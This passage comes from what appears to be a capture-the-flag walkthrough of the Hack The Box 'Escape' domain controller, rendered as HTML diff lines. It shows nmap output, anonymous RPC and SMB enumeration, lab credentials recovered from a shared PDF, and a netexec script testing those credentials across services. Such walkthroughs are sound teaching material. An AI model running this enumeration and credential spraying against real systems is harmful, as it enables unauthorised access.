+</span><span id="__span-2-53"><a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2074</span>-01-05T23:03:57
+</span><span id="__span-2-54"><a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a><span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>sequel.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-2-55"><a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-08-17T22:19:48+00:00<span class="p">;</span><span class="w"> </span>+8h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-2-56"><a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:
+</span><span id="__span-2-57"><a id="__codelineno-2-57" name="__codelineno-2-57" href="#__codelineno-2-57"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:dc.sequel.htb,<span class="w"> </span>DNS:sequel.htb,<span class="w"> </span>DNS:sequel
+</span><span id="__span-2-58"><a id="__codelineno-2-58" name="__codelineno-2-58" href="#__codelineno-2-58"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2024</span>-01-18T23:03:57
+</span><span id="__span-2-59"><a id="__codelineno-2-59" name="__codelineno-2-59" href="#__codelineno-2-59"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2074</span>-01-05T23:03:57
+</span><span id="__span-2-60"><a id="__codelineno-2-60" name="__codelineno-2-60" href="#__codelineno-2-60"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>DC<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+</span><span id="__span-2-61"><a id="__codelineno-2-61" name="__codelineno-2-61" href="#__codelineno-2-61"></a>
+</span><span id="__span-2-62"><a id="__codelineno-2-62" name="__codelineno-2-62" href="#__codelineno-2-62"></a>Host<span class="w"> </span>script<span class="w"> </span>results:
+</span><span id="__span-2-63"><a id="__codelineno-2-63" name="__codelineno-2-63" href="#__codelineno-2-63"></a><span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>8h00m00s,<span class="w"> </span>deviation:<span class="w"> </span>0s,<span class="w"> </span>median:<span class="w"> </span>7h59m59s
+</span><span id="__span-2-64"><a id="__codelineno-2-64" name="__codelineno-2-64" href="#__codelineno-2-64"></a><span class="p">|</span><span class="w"> </span>smb2-security-mode:
+</span><span id="__span-2-65"><a id="__codelineno-2-65" name="__codelineno-2-65" href="#__codelineno-2-65"></a><span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:
+</span><span id="__span-2-66"><a id="__codelineno-2-66" name="__codelineno-2-66" href="#__codelineno-2-66"></a><span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+</span><span id="__span-2-67"><a id="__codelineno-2-67" name="__codelineno-2-67" href="#__codelineno-2-67"></a><span class="p">|</span><span class="w"> </span>smb2-time:
+</span><span id="__span-2-68"><a id="__codelineno-2-68" name="__codelineno-2-68" href="#__codelineno-2-68"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-08-17T22:19:11
+</span><span id="__span-2-69"><a id="__codelineno-2-69" name="__codelineno-2-69" href="#__codelineno-2-69"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
+</span><span id="__span-2-70"><a id="__codelineno-2-70" name="__codelineno-2-70" href="#__codelineno-2-70"></a>
+</span><span id="__span-2-71"><a id="__codelineno-2-71" name="__codelineno-2-71" href="#__codelineno-2-71"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>&lt;https://nmap.org/submit/&gt;<span class="w"> </span>.
+</span><span id="__span-2-72"><a id="__codelineno-2-72" name="__codelineno-2-72" href="#__codelineno-2-72"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">93</span>.92<span class="w"> </span>seconds
+</span></code></pre></div>
+<p>The host appears to be a DC, add this also on etc hosts: Subject Alternative Name: DNS: <code>dc.sequel.htb</code> and also change it to match to domain accordingly:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="m">10</span>.129.228.253<span class="w"> </span>dc.sequel.htb<span class="w"> </span>sequel.htb
+</span></code></pre></div>
+<h2 id="rpc-enumeration">RPC enumeration</h2>
+<h3 id="anonymous-logon"><strong>Anonymous logon</strong></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-N<span class="w"> </span>sequel.htb
+</span></code></pre></div>
+<p>tried running some commands but got access denied:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-N<span class="w"> </span>sequel<span class="se">\.</span>htb
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>enumdomusers
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>result<span class="w"> </span>was<span class="w"> </span>NT_STATUS_ACCESS_DENIED
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>enumdomains
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>result<span class="w"> </span>was<span class="w"> </span>NT_STATUS_ACCESS_DENIED
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>
+</span></code></pre></div>
+<h2 id="smb-enumeration">SMB enumeration</h2>
+<h3 id="anonymous-logon_1">Anonymous logon</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>smbclient<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span>sequel.htb
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>---------<span class="w">       </span>----<span class="w">      </span>-------
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>ADMIN$<span class="w">          </span>Disk<span class="w">      </span>Remote<span class="w"> </span>Admin
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>C$<span class="w">              </span>Disk<span class="w">      </span>Default<span class="w"> </span>share
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>IPC$<span class="w">            </span>IPC<span class="w">       </span>Remote<span class="w"> </span>IPC
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>NETLOGON<span class="w">        </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>Public<span class="w">          </span>Disk<span class="w">      </span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>SYSVOL<span class="w">          </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+</span></code></pre></div>
+<p>hm i saw here the share <code>Public</code> which is not a default one, we could inspect it further:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>smbclient<span class="w"> </span>//sequel.htb/Public
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Nov<span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="m">05</span>:51:25<span class="w"> </span><span class="m">2022</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Nov<span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="m">05</span>:51:25<span class="w"> </span><span class="m">2022</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span>SQL<span class="w"> </span>Server<span class="w"> </span>Procedures.pdf<span class="w">           </span>A<span class="w">    </span><span class="m">49551</span><span class="w">  </span>Fri<span class="w"> </span>Nov<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">07</span>:39:43<span class="w"> </span><span class="m">202</span>
+</span></code></pre></div>
+<p>Interesting, lets download it:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span>Procedures.pdf<span class="w"> </span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>NT_STATUS_OBJECT_NAME_NOT_FOUND<span class="w"> </span>opening<span class="w"> </span>remote<span class="w"> </span>file<span class="w"> </span><span class="se">\S</span>QL
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span><span class="s2">&quot;SQL Server Procedures.pdf&quot;</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>getting<span class="w"> </span>file<span class="w"> </span><span class="se">\S</span>QL<span class="w"> </span>Server<span class="w"> </span>Procedures.pdf<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">49551</span><span class="w"> </span>as<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span>Procedures.pdf<span class="w"> </span><span class="o">(</span><span class="m">1512</span>.2<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">1512</span>.2<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+</span></code></pre></div>
+<p>(here you must use double quotes to download this file, since the filename contains spaces)</p>
+<p>Next, i viewed the pdf: <code>SQL Server Procedures.pdf</code></p>
+<p>1st page:</p>
+<p><img alt="image.png" src="../MediaFiles/escape_image1.png" /></p>
+<p>2nd page:</p>
+<p><img alt="image.png" src="../MediaFiles/escape_image2.png" /></p>
+<ul>
+<li>For the <code>domain joined</code> machines, the SQL Management Studio link is</li>
+</ul>
+<p><a href="https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16">https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16</a></p>
+<ul>
+<li>For the <code>non domain joined</code> machines, the command inside the pdf is:</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>cmdkey<span class="w"> </span>/add:<span class="s2">&quot;&lt;serverName&gt;.sequel.htb&quot;</span><span class="w"> </span>/user:<span class="s2">&quot;sequel\&lt;userame&gt;&quot;</span><span class="w"> </span>/pass:&lt;password&gt;
+</span></code></pre></div>
+<ul>
+<li>Also, Brandon’s mail here is: <a href="mailto:brandon.brown@sequel.htb"><code>brandon.brown@sequel.htb</code></a></li>
+<li>Lastly, we are given creds:</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>PublicUser
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>GuestUserCantWrite1
+</span></code></pre></div>
+<p>So in the contents of the pdf file give out important information. The first hint we are given, is that it has to do with SQL, and specifically an SQL Server. </p>
+<p>Later on, the pdf informs us that machines out of the domain can connect in a different way, using cmdkey command instead of installing the SQL Management Studio.</p>
+<p>Furthermoe, since we are give creds, we could check whether we can login somewhere with them first:</p>
+<h2 id="checking-where-we-can-login-with-the-given-creds">Checking where we can login with the given creds</h2>
+<p>Lets now use my script to bulk check the services to which we can login with those creds: <a href="https://github.com/ch3ckkm8/auto_netexec">ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</a></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>sequel.htb<span class="w"> </span><span class="s1">&#39;PublicUser&#39;</span><span class="w"> </span><span class="s1">&#39;GuestUserCantWrite1&#39;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">5985</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">5985</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\P</span>ublicUser:GuestUserCantWrite1
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\P</span>ublicUser:GuestUserCantWrite1<span class="w"> </span>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>LDAPS<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">636</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Error<span class="w"> </span><span class="k">in</span><span class="w"> </span>searchRequest<span class="w"> </span>-&gt;<span class="w"> </span>operationsError:<span class="w"> </span>000004DC:<span class="w"> </span>LdapErr:<span class="w"> </span>DSID-0C090A5C,<span class="w"> </span>comment:<span class="w"> </span>In<span class="w"> </span>order<span class="w"> </span>to<span class="w"> </span>perform<span class="w"> </span>this<span class="w"> </span>operation<span class="w"> </span>a<span class="w"> </span>successful<span class="w"> </span><span class="nb">bind</span><span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span>completed<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>connection.,<span class="w"> </span>data<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>v4563
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>LDAPS<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">636</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\P</span>ublicUser:GuestUserCantWrite1<span class="w"> </span>
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>RPC<span class="w">         </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">135</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>RPC<span class="w">         </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">135</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\P</span>ublicUser:GuestUserCantWrite1<span class="w"> </span><span class="o">(</span>RPC_S_SEC_PKG_ERROR<span class="o">)</span>
+</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>
+</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>
+</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>
+</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>
+</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a>
+</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>mssql<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Testing<span class="w"> </span>MSSQL<span class="w"> </span>with<span class="w"> </span>domain/Windows<span class="w"> </span>auth...
